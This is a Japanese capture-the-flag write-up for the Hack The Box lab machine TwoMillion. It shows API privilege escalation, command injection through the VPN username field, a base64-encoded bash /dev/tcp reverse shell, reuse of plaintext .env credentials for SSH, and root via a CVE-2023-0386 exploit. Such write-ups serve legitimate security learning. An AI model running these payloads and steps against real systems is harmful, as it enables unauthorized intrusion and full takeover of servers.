# TwoMillion(Easy)

## User flag

とりあえず使われてそうな範囲でnmap

```txt
nmap -sV -p 1-10000 10.10.11.221 --max-rtt-timeout=500ms
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-05 23:27 EDT
Nmap scan report for 10.10.11.221
Host is up (0.18s latency).
Not shown: 9998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.79 seconds
```

httpとsshが動いている。とりあえずブラウザでアクセスしてみる。

hostsファイルを編集して到達できるようにした後、webページ内を探索してみる  
`/invite`ページがあったので色々探索してみる。`inviteapi.min.js`というJSが動いているようなのでこれを調べてみると、難読化がされており読めない。

[de4js](https://lelinhtinh.github.io/de4js/)を使って難読化を解除すると色々読めるようになった。  

何をしているのかまだよくわからないので、consoleで`makeInviteCode()`を実行して動かしてみる。すると暗号化済みデータが返ってくる。`enctype: "ROT13"`という記述が確認できた。いわれた通りROT13で送られてきた暗号化済みデータを復号すると

`In order to generate the invite code, make a POST request to /api/v1/invite/generate`という記述が得られた。次はこの指示通りPOSTでAPIを叩いてみる。

`curl`でPOSTしたいときは`curl -X POST [host]`のようにしてメソッドを指定できる。

結果はこれ:

`{"0":200,"success":1,"data":{"code":"WDc3VlEtQUNRQ0gtQ0JHSEQtUUhHMUk=","format":"encoded"}}`

末尾に=があるのでbase64か?decodeしてInviteCodeの入力欄に入れたところ正常にアカウント登録画面に移動できた。  

`2million.htb/home/access`の`Connection Pack`をクリックすると`/api/v1/user/vpn/generate`というエンドポイントが叩かれている。  

ここで、実際に`Connection Pack`をクリックするとCookiesとして`PHPSESSID`の値が送信されていることがわかる。
今回は`rvd3usgqn4ol8893tgmqs19f6r`だったので以下これを使う

では、`/api`を叩いて何か見えないかを試してみる

burpsuiteを起動しproxy settingを済ませた後、interceptしてPHPSESSIDをセットしてから送信する。  
すると

```json
/api/v1:    "Version 1 of the API"
```

という記述がある。次は`/api/v1`に対して同様に操作すると

```json
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

が返ってきた。admin向けと思われるエンドポイントが確認できる。権限昇格を行いたい。PUTで叩く必要があるのでまたcurlを使う。

`curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=rvd3usgqn4ol8893tgmqs19f6r"`

で

```json
{"status":"danger","message":"Invalid content type."} 
```

が返ってきた。content typeで何が想定されているのか知りたいので

APIがjsonで応答することは既に分かっているので、headerに`Content-Type: application/json`を追加してもう一度PUTを試す。

`curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=rvd3usgqn4ol8893tgmqs19f6r" -H "Content-Type:application/json"`

すると今度は

```json
{"status":"danger","message":"Missing parameter: email"}      
```

が返ってきたので、Content-Typeに応じてJSONでデータを送信してみる。

```shell
curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=rvd3usgqn4ol8893tgmqs19f6r" -v -H "Content-Type:application/json" -d '{"email":"kali@mozzila.mail"}'
```

とすると、今度は

```json
{"status":"danger","message":"Missing parameter: is_admin"}  
```

が返ってきた。同じ要領で`"is_admin":"true"`を渡すと1か0で渡すよう言われるのでそうする。結果次のように帰ってきた

```json
{"id":24,"username":"kali","is_admin":1} 
```

id24のkali(自分で作ったアカウント)のis_adminが1になったので権限昇格できていそう。

`http://2million.htb/api/v1/admin/auth`を叩くと確かにtrueが返される。

admin専用のAPIを叩きに行く。

```shell
curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=rvd3usgqn4ol8893tgmqs19f6r" -H "Content-Type:application/json" -d '{"username":"kali"}' > ./Desktop/2mililon.ovpn
```

これでVPNの接続情報が返された。ここで返された内容の次の部分に注目すると、入力したユーザ名kaliが中身に記述されている

```txt
<cert>
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 2 (0x2)
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C=UK, ST=London, L=London, O=HackTheBox, OU=VPN, CN=2million/emailAddress=info@hackthebox.eu
        Validity
            Not Before: Jul  6 07:37:40 2025 GMT
            Not After : Jul  6 07:37:40 2026 GMT
        Subject: C=GB, ST=London, L=London, O=kali, CN=kali
        Subject Public Key Info:
```

このファイルの生成にPHPのexecなりが使用されているならOS command injectionを狙える。

```shell
curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=rvd3usgqn4ol8893tgmqs19f6r" -H "Content-Type:application/json" -d '{"username":"kali;id;"}' > ./Desktop/2million.ovpn
```

で編集されたファイルを確認すると

```txt
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

が返ってきた。行ける。

`ip a`でtun0のipアドレスを確認して、Reverse Shell generatorを使って

```shell
/bin/bash -i >& /dev/tcp/10.10.10.10/9001 0>&1
```

コマンドが得られた。そのまま使うことはできなかったのでbase64 encodeして送信、サーバ側でdecodeしてbashに渡すという流れで対処する。

よって、まずローカルで

```shell
echo /bin/bash -i >& /dev/tcp/10.10.10.10/9001 0>&1 | base64
```

して得られた文字列を

```shell
curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=rvd3usgqn4ol8893tgmqs19f6r" -H "Content-Type:application/json" -d '{"username":"kali;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjI4LzkwMDEgMD4mMQo= | base64 -d | bash;"}'
```

として組み立て、ncで

```shell
nc -lvnp 9001
```

としてキャッチする。

接続した先でまずファイルを探索すると、`Database.php`などのphpファイルが見つかる。`ls -al`で表示すると`.env`ファイルがあり、この中に

```txt
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

と記述されていた。adminというユーザが存在することがうかがえる。手元で

`ssh admin@2million.htb`として接続を試してみるとこのクレデンシャルでadminとして入れた。

`user.txt`があったのでUSER FLAGは取得できた。

## ROOT FLAG

脆弱性の調査を行う。

```shell
admin@2million:~/CVE-2023-0386-main$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 22.04.2 LTS
Release:        22.04
Codename:       jammy
```

```shell
admin@2million:~/CVE-2023-0386-main$ uname -r
5.15.70-051570-generic
```

ホームディレクトリに`CVE-2023-0386-main`というディレクトリが存在しているという誘導があるので、実際にこれが使えそうだという事がわかる。

README通り`make all`して、ssh接続をもう一つ増やし最初のターミナルで

```shell
./fuse ./ovlcap/lower ./gc
```

二つ目のターミナルで

```shell
./exp
```

とすると、うまくいった。

あとは

`sudo ls /root`
`sudo cat /root/root.txt`
